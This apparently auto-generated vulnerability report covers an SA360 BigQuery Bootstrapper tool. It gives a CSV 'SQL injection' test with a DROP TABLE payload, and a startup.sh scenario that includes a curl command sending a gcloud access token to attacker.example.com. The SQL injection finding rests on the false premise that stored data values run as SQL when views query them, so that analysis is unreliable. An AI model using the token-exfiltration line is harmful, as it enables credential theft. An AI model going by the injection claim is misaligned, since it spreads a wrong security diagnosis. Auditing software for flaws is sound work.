## Combined Vulnerability List

### SQL Injection via Malicious CSV File

- **Vulnerability Name:** SQL Injection via Malicious CSV File

- **Description:**
  An attacker can inject SQL commands into the historical CSV data files. When the application processes these files and loads the data into Google BigQuery, the injected SQL commands can be executed. This is possible because the application lacks proper input sanitization when handling CSV data. Specifically, if a malicious CSV file containing SQL injection payloads is uploaded and processed by the application, these payloads are directly inserted into BigQuery tables. When these tables are queried, especially through the views created by the application, the injected SQL commands can be executed, potentially leading to unauthorized actions within the user's BigQuery project.

  Steps to trigger the vulnerability:
  1. An attacker crafts a malicious CSV file. This file contains SQL injection payloads within the data fields (e.g., in columns like 'keyword', 'account_name', 'campaign_name', etc.). For example, a payload could be `";DROP TABLE views.ReportView_YOUR_ADVERTISER_ID;--"`.
  2. The attacker uploads this malicious CSV file to the Google Cloud Storage bucket associated with the project, or uploads it via Cloud Shell if using that method. This is done as part of providing historical data to the application.
  3. The user runs the SA360 BigQuery Bootstrapper script, configuring it to process the uploaded historical data.
  4. The script reads the malicious CSV file and uses the data to create or update BigQuery tables. The SQL injection payloads from the CSV file are now stored as data within these BigQuery tables.
  5. When the application creates or updates BigQuery views (like `ReportView_YOUR_ADVERTISER_ID` or `HistoricalConversionReport_YOUR_ADVERTISER_ID`), these views query the tables populated with the potentially malicious data.
  6. When these views are executed (either automatically by the script during setup or later by a user querying the views), the SQL injection payloads embedded in the data are interpreted and executed by BigQuery.

- **Impact:**
  Successful exploitation of this vulnerability can lead to critical impacts:
  - **Data Breach**: Attackers could potentially extract sensitive data from the user's BigQuery project by injecting `SELECT` statements to query tables they are not authorized to access directly.
  - **Data Modification or Deletion**: Attackers could modify or delete existing data within the BigQuery project. For instance, they could drop tables, truncate data, or update records in a way that compromises data integrity and availability.
  - **Privilege Escalation (Potentially)**: Depending on the BigQuery permissions of the service account or user running the queries, an attacker might be able to perform actions beyond the intended scope of the application, possibly escalating privileges within the BigQuery environment.
  - **Reputation Damage**: If exploited, this vulnerability could severely damage the reputation of the tool and erode user trust.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
  There are no currently implemented mitigations in the project to prevent SQL Injection vulnerabilities arising from malicious CSV files. The code directly processes and loads CSV data into BigQuery without any input sanitization or validation.

- **Missing Mitigations:**
  To mitigate this vulnerability, the following measures are crucial:
  - **Input Sanitization and Validation**: Implement robust input sanitization and validation for all data read from CSV files before loading it into BigQuery. This should include:
    - **Escaping Special Characters**: Escape or remove characters that have special meaning in SQL (e.g., single quotes, double quotes, semicolons, backslashes) from the CSV data.
    - **Data Type Validation**: Validate that the data in each column of the CSV file conforms to the expected data type.
    - **Whitelist Allowed Characters**: Restrict input to a whitelist of allowed characters for each field, rejecting any input that contains characters outside of this whitelist.
  - **Prepared Statements or Parameterized Queries**: When constructing BigQuery queries in `views.py` (especially within the view definitions), use parameterized queries or prepared statements instead of string concatenation to incorporate data. However, in this specific case, the vulnerability is introduced by data *ingestion*, not query construction in `views.py`. Therefore, sanitizing CSV input is the primary mitigation.
  - **Principle of Least Privilege**: Ensure that the service account used by the application to interact with BigQuery has the minimum necessary permissions. This limits the potential damage if an SQL injection attack is successful. Regularly review and restrict BigQuery IAM roles assigned to the service account.
  - **Regular Security Audits**: Conduct regular security audits and penetration testing of the application to identify and remediate potential vulnerabilities.

- **Preconditions:**
  1. **User Interaction**: A user must use the application to upload and process historical data from a CSV file.
  2. **Malicious CSV File**: The attacker must be able to provide a malicious CSV file that will be processed by the application. This could be achieved if the attacker can convince a user to upload a file they control, or if there's a way to inject files into the storage bucket used by the application.
  3. **No Input Sanitization**: The application must lack input sanitization for CSV data before loading it into BigQuery. This precondition is met as per the source code analysis.

- **Source Code Analysis:**
  1. **File: `/code/csv_decoder.py`**:
     - This file handles the decoding of CSV files. The `FileDecoder.decode_csv` function uses `pandas.read_csv` to parse CSV files.
     - **Vulnerability Point**: The `pandas.read_csv` function, while powerful for CSV parsing, does not inherently sanitize data against SQL injection. The data read from the CSV is directly passed on for further processing and eventual loading into BigQuery without any intermediate sanitization steps within this decoder or later in the data pipeline.
     - There is no explicit sanitization or escaping of data within this file.

  2. **File: `/code/bootstrapper.py`**:
     - The `Bootstrap.load_historical_tables` function is responsible for loading historical data into BigQuery.
     - It uses `self.combine_folder()` to process the uploaded files (including CSVs) and then calls `client.load_table_from_uri` to load the data into a BigQuery table.
     - **Vulnerability Propagation**: The `combine_folder` method, which uses `csv_decoder.Decoder`, processes the CSV data. The loaded data is then directly used in BigQuery load jobs.
     - **No Sanitization**: Critically, there is no code in `load_historical_tables` or `combine_folder` that sanitizes the CSV data before it's loaded into BigQuery. The data is taken as-is from the CSV and inserted into BigQuery.

  3. **File: `/code/views.py`**:
     - This file defines SQL views that are created in BigQuery. For example, `historical_conversions`, `keyword_mapper`, `report_view`, `historical_report` functions define the SQL queries for these views.
     - **Exploitation Context**: While the view definitions themselves are written in a way that uses string formatting, the SQL injection vulnerability is not directly in the view definition code, but rather in the *data* that these views query. If malicious SQL commands are injected into the historical CSV data and loaded into the underlying BigQuery tables, these commands can be triggered when the views query this data.
     - For example, the `historical_conversions` view queries the historical table:
       ```sql
       SELECT
           -- ...
       FROM `{project}`.`{raw}`.`{historical_table_name}` h
       INNER JOIN (
           -- ...
       ) a
           ON a.keyword=h.keyword
           AND a.campaign=h.campaign_name
           -- ...
       ```
       If `historical_table_name` table (populated from the CSV) contains malicious SQL in columns like `keyword`, `campaign_name`, etc., these could be executed when this view is queried.

  **Visualization of Vulnerability Flow:**

  ```
  [Malicious CSV File] --> (/code/bootstrapper.py) Bootstrap.combine_folder() --> (/code/csv_decoder.py) Decoder --> pandas.read_csv --> [Unsanitized Data] --> (/code/bootstrapper.py) Bootstrap.load_historical_tables() --> BigQuery [Raw Tables with Malicious Data] --> (/code/views.py) CreateViews.view() --> BigQuery [Views querying Raw Tables] --> [SQL Injection Execution when Views are Queried]
  ```

- **Security Test Case:**
  1. **Setup Test Environment**:
     - Deploy the SA360 BigQuery Bootstrapper in a test Google Cloud Project.
     - Ensure you have the necessary permissions to create BigQuery datasets, tables, and views, and to run the bootstrapper script.
  2. **Create Malicious CSV File**:
     - Create a CSV file named `malicious_data.csv` with the following content. This CSV injects a `DROP TABLE` command into the `keyword` column. Replace `YOUR_PROJECT_ID`, `YOUR_RAW_DATASET`, and `YOUR_ADVERTISER_ID` with your actual project details.

       ```csv
       date,account_name,campaign_name,ad_group,match_type,conversions,revenue,keyword
       2023-01-01,MaliciousAccount,MaliciousCampaign,MaliciousAdGroup,Exact,1,1,"', concat(';DROP TABLE `YOUR_PROJECT_ID.views.ReportView_YOUR_ADVERTISER_ID`;--') as keyword_injection, '"
       2023-01-02,Account2,Campaign2,AdGroup2,Broad,2,2,"Keyword2"
       ```
       **Note**: Replace `YOUR_PROJECT_ID` and `YOUR_ADVERTISER_ID` in the payload with your test project's ID and a relevant advertiser ID. Be extremely cautious when testing table deletion; use a test advertiser ID and dataset. For safer testing, you could inject a less destructive payload initially, like a `SLEEP(10)` command to observe execution delay, or a `SELECT VERSION()` to confirm code execution. However, `DROP TABLE` is used here to clearly demonstrate the impact.

  3. **Upload Malicious CSV**:
     - Using the Cloud Shell or Google Cloud Console, upload `malicious_data.csv` to the Google Cloud Storage bucket that you will configure the bootstrapper to use for historical data.
  4. **Run Bootstrapper with Malicious File**:
     - Execute the bootstrapper script (`run.py`) in interactive mode.
     - When prompted for historical data file path, provide the path to `malicious_data.csv` in your GCS bucket (e.g., `gs://your-bucket-name/malicious_data.csv`).
     - Complete the interactive setup, providing your project ID, advertiser ID, and other required details. Ensure 'Include Historical Data?' is set to true.
  5. **Verify SQL Injection**:
     - After the script completes, check your BigQuery project.
     - **Check for Table Drop**: Navigate to the `views` dataset in your BigQuery project. Verify if the `ReportView_YOUR_ADVERTISER_ID` table (replace `YOUR_ADVERTISER_ID`) has been dropped. If the table is missing, it indicates successful SQL injection.
     - **Check Execution Logs (Optional)**: Examine BigQuery audit logs or execution logs for any errors or unusual activities that might indicate the execution of the injected SQL command.
  6. **Cleanup (Important)**:
     - If the table was dropped, you may need to redeploy the application or manually recreate any necessary BigQuery resources.
     - **Always test in a non-production environment and be extremely careful with destructive payloads like `DROP TABLE`. Start with less harmful payloads to confirm injection before attempting destructive actions.**

  **Expected Result**: If the SQL injection is successful, the `ReportView_YOUR_ADVERTISER_ID` table should be dropped from your BigQuery `views` dataset after running the bootstrapper with the malicious CSV file. This confirms the SQL injection vulnerability.

### Malicious .bashrc modification in startup.sh

- **Vulnerability Name:** Malicious .bashrc modification in startup.sh

- **Description:**
    1. A malicious actor forks the repository.
    2. The attacker modifies the `startup.sh` script in the forked repository to replace the legitimate `PATH` modification command with a malicious command injection into the `.bashrc` file. For example, the attacker could replace `echo "PATH=\$PATH:$HOME/.local/bin" >> $HOME/.bashrc` with `echo "echo 'Vulnerable' > /tmp/vulnerable.txt" >> $HOME/.bashrc`.
    3. The attacker convinces a victim user to use the modified tutorial from the forked repository. This could be achieved through social engineering techniques, such as sharing a link to the forked repository with misleading instructions.
    4. The victim user, believing they are following the legitimate tutorial, clicks the "Open in Cloud Shell" button in the modified README.md, which points to the forked repository and tutorial.
    5. The victim user executes the command `source startup.sh <your-project-id>` in their Cloud Shell as instructed by the tutorial.
    6. The modified `startup.sh` script executes, appending the attacker's malicious command (`echo 'Vulnerable' > /tmp/vulnerable.txt` in this example) to the victim's `.bashrc` file.
    7. Every time the victim starts a new Cloud Shell session, the commands in `.bashrc` are executed, including the attacker's injected command. In this example, it will create a file `/tmp/vulnerable.txt` with the content "Vulnerable". A more sophisticated attack could involve data exfiltration or further malicious actions.

- **Impact:**
    - Arbitrary command execution in the user's Cloud Shell environment upon each new session start.
    - Potential for persistent compromise of the user's Cloud Shell environment.
    - Possible data exfiltration from the Cloud Shell environment.
    - Potential for credential theft if malicious commands are designed to steal credentials.
    - Further compromise of the user's Google Cloud project depending on the malicious commands injected.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. The project does not currently implement any mitigations against malicious modification of `startup.sh`.

- **Missing Mitigations:**
    - **Avoid modifying `.bashrc`**: The most effective mitigation is to avoid modifying the user's `.bashrc` file altogether. If modifying the `PATH` is necessary, consider alternative methods that do not involve persistent changes to shell configuration files, or provide clear instructions for manual configuration instead of automated modification.
    - **Warning to user**: If modifying `.bashrc` is deemed absolutely necessary, implement a clear warning message in `startup.sh` that informs the user about the `.bashrc` modification and the potential security implications, especially when using scripts from untrusted sources.
    - **Input validation (less relevant here)**: While input validation on the project ID might slightly reduce the attack surface in other parts of the script, it does not directly mitigate the `.bashrc` injection vulnerability.

- **Preconditions:**
    - The victim user must be socially engineered into using a forked and maliciously modified version of the repository.
    - The victim user must execute the `startup.sh` script from the malicious repository in their Cloud Shell.

- **Source Code Analysis:**
    - File: `/code/startup.sh`
    - Line:
    ```bash
    echo "PATH=\$PATH:$HOME/.local/bin" >> $HOME/.bashrc
    ```
    - This line appends the specified `PATH` modification command to the user's `.bashrc` file.
    - A malicious actor can replace this line with any arbitrary command injection, for example:
    ```bash
    echo "curl -X POST -d \$(gcloud auth print-access-token) https://attacker.example.com/steal-token" >> $HOME/.bashrc
    ```
    - When the user executes the modified `startup.sh`, this malicious `echo` command will append the command to exfiltrate the access token to the attacker's server to `.bashrc`.
    - Upon next Cloud Shell startup, `.bashrc` is sourced, and the malicious command will be executed, sending the access token to the attacker.

- **Security Test Case:**
    1. Fork the repository on GitHub.
    2. Edit the `/code/startup.sh` file in the forked repository. Replace the line `echo "PATH=\$PATH:$HOME/.local/bin" >> $HOME/.bashrc` with `echo "echo 'Vulnerable' > /tmp/vulnerable.txt" >> $HOME/.bashrc`. Commit the change.
    3. Create a new Google Cloud project for testing purposes.
    4. In your browser, navigate to the forked repository on GitHub.
    5. Click the "Open in Cloud Shell" button in the README.md of your forked repository. This will open a Cloud Shell session with the code from your forked repository.
    6. In the Cloud Shell terminal, execute the command: `source startup.sh <your-project-id>` (replace `<your-project-id>` with the ID of your test project).
    7. Close the current Cloud Shell session by typing `exit` and pressing Enter.
    8. Open a new Cloud Shell session.
    9. In the new Cloud Shell session, check if the file `/tmp/vulnerable.txt` exists and contains the text "Vulnerable" by running: `cat /tmp/vulnerable.txt`.
    10. If the file exists and contains "Vulnerable", the vulnerability is confirmed. This demonstrates that arbitrary commands can be injected into `.bashrc` via a modified `startup.sh` and will be executed in subsequent Cloud Shell sessions.